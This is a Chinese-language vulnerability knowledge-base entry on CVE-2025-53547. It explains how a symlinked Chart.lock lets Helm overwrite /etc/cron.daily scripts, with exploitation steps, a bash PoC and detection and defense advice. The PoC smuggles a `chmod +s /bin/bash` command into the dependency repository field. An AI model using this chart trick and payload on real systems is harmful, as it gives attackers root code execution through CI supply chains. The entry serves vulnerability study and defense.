---
id: cloud-k8s-helm-chart-lock-symlink-follow-cron-rce
title: Helm Chart.lock 符号链接跟随写入任意文件：恶意 chart 经 cron 脚本实现代码执行（CVE-2025-53547）
type: scenario
domain: cloud
path: cloud/k8s
technique: chart-lock-symlink-follow-write
aliases:
- CVE-2025-53547
- Helm Chart.lock 符号链接
- helm dependency update 符号链接
- helm dependency build 符号链接
- writeLock symlink
- Helm 依赖更新代码注入
- Chart.lock 任意文件写入
tags:
- kubernetes
- helm
- chart
- symlink
- arbitrary-file-write
- cron
- rce
- supply-chain
- cve
cve:
- CVE-2025-53547
severity: high
confidence: medium
affected_versions: Helm < 3.18.4
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V237
  verified_at: '2026-11-07T09:20:38+08:00'
  notes: 已对照原文核对（21 图）；符号链接跟随写入 /etc/cron.daily/1 已实测，cron 实际执行/提权未验证，confidence medium；版本已设为 Helm < 3.18.4。
---

## 一句话结论

当受害者在不可信 Helm chart 目录内以高权限执行 `helm dependency update`（或 `helm dependency build`）时，若目录中的 `Chart.lock` 是指向已存在空文件/可解析 YAML 文件的符号链接，`writeLock` 会跟随链接把攻击者可控的 lock YAML 写到链接目标；把目标选为 `/etc/cron.daily` 等会被自动执行的脚本文件，即可借助 `repository` 字段中 `;` + `$IFS` 构造的 shell 命令获得 root 代码执行。

## 原理

- `pkg/downloader/manager.go` 的 `Manager.Update()` 在完成依赖解析与下载后调用 `writeLock(m.ChartPath, lock, c.Metadata.APIVersion == chart.APIVersionV1)`。`writeLock` 将 `chart.Lock` 序列化为 YAML，拼出 `dest := filepath.Join(chartpath, "Chart.lock")`（v1 chart 为 `requirements.lock`），最后 `os.WriteFile(dest, data, 0644)`。
- `os.WriteFile` 以 `O_WRONLY|O_CREATE|O_TRUNC` 打开路径，内核会跟随路径末尾的符号链接并对链接目标截断写入；3.18.4 之前 `writeLock` 没有先用 `os.Lstat` 检查 `dest` 是否为符号链接，因此 chart 目录内的 `Chart.lock` 链接可以指向目录外的任意可写文件。修复版本在写入前增加 `os.Lstat(dest)`，发现 `info.Mode()&os.ModeSymlink != 0` 即报错拒绝。
- 写入内容是 lock YAML，字段包括 `generated`、`digest` 和 `dependencies[].name/repository/version`。其中依赖的 `name`、`repository`、`version` 来自攻击者控制的 `Chart.yaml`，并作为 YAML 标量写入，`;`、`$IFS`、`?`、`=` 等字符均可保留；`repository` 可以写成“真实仓库 URL + 查询串形式的 shell 片段”，既能让 Helm 正常解析依赖（HTTP 服务忽略查询串），又能在文件被 shell 执行时触发命令。
- 触发前 Helm 会先读取该 chart 目录：`loadChartDir()` → `loader.LoadDir()` 用 `sympath.Walk` 遍历并读取符号链接目标的内容，`LoadFiles()` 再对 `Chart.lock` 做 `yaml.Unmarshal`。因此链接目标必须在执行时存在，且内容为空或可被解析成 YAML；链接悬空会在读取阶段失败，指向 `.bashrc` 这类非 YAML 文件会在解析阶段报错（只会导致命令失败/崩溃，不能静默利用）。
- 空目标文件会被解析成 nil Lock：`Manager.Build()` 在 `c.Lock == nil` 时直接 `return m.Update()`，所以 `helm dependency build` 与 `helm dependency update` 都能触发写入；`Update()` 中 `oldLock == nil` 或 digest 不同即执行 `writeLock`，空文件必然满足。
- 代码执行侧：`/etc/cron.daily` 下的可执行文件会被 run-parts 当 shell 脚本执行。写入的文件内容是 `dependencies:`、`- name: ...`、`  repository: https://...;chmod$IFS+s$IFS/bin/bash`、`digest: ...` 等行；前两行不是有效命令但不会中止脚本（无 `set -e`），执行到 `repository` 行时 shell 在 `;` 后运行 `chmod$IFS+s$IFS/bin/bash`，`$IFS` 展开为空白，等价于 `chmod +s /bin/bash`，从而留下 setuid root 的 bash（亦可替换为任意命令）。

## 触发条件

- Helm 版本低于 3.18.4（原文标注；3.18.4 起 `writeLock` 增加符号链接检查）。
- 攻击者能控制被处理的 chart 目录：`Chart.yaml` 中的依赖字段可控，且 `Chart.lock`（v1 chart 为 `requirements.lock`）是符号链接。通过 git clone/仓库分发或打包解包保留符号链接即可将该目录交给受害者。
- 受害者以对该目标文件有写权限的身份执行 `helm dependency update` 或 `helm dependency build`；CI 中常见以 root 或高权限运行，可写系统目录。
- 链接目标必须在 Helm 读取时已存在且为空或合法 YAML，同时是后续会被执行/消费的路径。原文的 cron 利用要求 `/etc/cron.daily` 下存在一个可执行文件：PoC 中以 root 预先 `touch` 并 `chmod +x` 一个空文件；真实攻击需要目标目录中恰好有可用的空可执行文件，或先通过其他手段落一个，这是该链的现实限制。
- 目标为 `.bashrc` 等非 YAML 文件时会在 `LoadFiles` 的 YAML 解析处失败，无法完成写入，只会造成中断/崩溃。

## 利用步骤

1. 构造恶意 chart 目录：`Chart.yaml` 的 `dependencies[].repository` 指向一个可正常解析的真实仓库 URL，并在 URL 后追加 `;` 与通过 `$IFS` 分隔的 shell 命令；给依赖填写满足约束的版本，使 `resolve` 成功并走到 `writeLock`。
2. 在 chart 目录内把 `Chart.lock` 做成指向目标文件的符号链接；目标文件需已存在且为空（v1 chart 则使用 `requirements.lock`）。
3. 受害者解包/克隆该 chart 后执行 `helm dependency update`；若 `Chart.lock` 指向空文件，执行 `helm dependency build` 也会在 `c.Lock == nil` 时进入 `Update()`。
4. Helm 读取链接目标（空 → nil lock），解析依赖并生成 lock YAML，`os.WriteFile` 跟随符号链接把 YAML 写入目标，覆盖原文件。
5. 目标若位于 `/etc/cron.daily` 等自动执行目录且可执行，cron 执行该脚本时命中 `repository` 行中 `;` 后的命令，以 root 执行（原文载荷为 `chmod +s /bin/bash`）。

## PoC

```bash
mkdir -p evil-chart && cd evil-chart
cat > Chart.yaml <<'EOF'
apiVersion: v2
name: evil-chart
version: 0.1.0
dependencies:
  - name: gatekeeper
    version: 3.19.2
    repository: 'https://open-policy-agent.github.io/gatekeeper/charts?a;chmod$IFS+s$IFS/bin/bash'
EOF

# 目标文件需预先存在；原文 PoC 以 root 创建空的可执行文件作为 cron 脚本
touch /etc/cron.daily/1
chmod +x /etc/cron.daily/1
ln -s /etc/cron.daily/1 Chart.lock

helm dependency build      # 或 helm dependency update
cat /etc/cron.daily/1
```

写入后的目标文件形如：

```yaml
dependencies:
- name: gatekeeper
  repository: https://open-policy-agent.github.io/gatekeeper/charts?a;chmod$IFS+s$IFS/bin/bash
  version: 3.19.2
digest: sha256:<attacker-influenced-digest>
generated: "<timestamp>"
```

该文件被 cron 当 shell 脚本执行时，`repository` 行 `;` 后的 `chmod$IFS+s$IFS/bin/bash` 生效。注意：此最小 PoC 依赖事先存在的可执行空文件；原文未展示 cron 实际触发后的效果，验证时需自行确认目标目录的执行策略与时间窗口。

## 变体与关联

- 变体：chart 的 `apiVersion: v1` 时 `writeLock` 写入 `requirements.lock`，符号链接应改为指向该文件名。
- 变体：`helm dependency build` 触发路径。当符号链接目标为空文件时，`c.Lock` 为 nil，`Build()` 回退到 `Update()`，与 `dependency update` 等效。
- 变体：目标选择不限于 cron。凡是 Helm 进程有写权限、且在写入前内容为空/可解析为 YAML 的常规文件都可被覆盖；但要形成代码执行，需要目标内容随后被 shell 或可信加载器消费。`.bashrc` 因 YAML 解析失败不可用。
- 关联：同类“符号链接跟随 + 写入自动执行路径”场景见 [[web-generic-file-upload-7zip-cve-2025-55188-symlink-cron-rce]]（7-Zip 解压写 cron）、[[web-golang-gogs-hooks-prereceive-symlink-write-rce]]（Gogs 写 git hooks）、[[cloud-container-docker-cp-symlink-toctou-escape]]（docker cp 符号链接读写宿主机文件）。本条的差异在于 sink 是 Helm 的 `writeLock`，触发面是 chart 依赖更新这一供应链环节。
- 关联：CVE-2025-53547 的修复只加 `Lstat` 检查 `dest`；同类审计应搜索所有 `os.WriteFile`/`os.OpenFile` 且路径可由外部 chart 内容影响的写入点，检查是否使用 `O_NOFOLLOW` 或先做 `Lstat` 校验。

## 检测与防御

- 升级 Helm 到 3.18.4 或更高版本，并同步更新 CI 镜像、vendored 二进制与各维护分支的修复版本；确认 `helm version`。
- 在 CI/部署前检查 chart 目录中的符号链接：`find <chartdir> -type l`、`test -L Chart.lock || test -L requirements.lock`，发现即拒绝构建；不要对来源不可信的 chart 执行 `helm dependency update/build`。
- 以最小权限运行 Helm，避免 root；CI 作业不授予对 `/etc`、cron 目录、用户家目录配置文件的写权限。
- 监控 `/etc/cron.daily`、`/etc/cron.hourly`、`/etc/cron.d` 等目录的文件创建/修改，尤其是内容为 YAML 且含 shell 元字符的可执行文件；对 cron 脚本做完整性校验。
- 代码层防御：写文件前 `os.Lstat` 并拒绝 `ModeSymlink`（3.18.4 的做法），条件允许时使用 `O_NOFOLLOW` 打开；对 chart 内所有相对路径做真实路径校验，禁止链接指向 chart 目录之外。
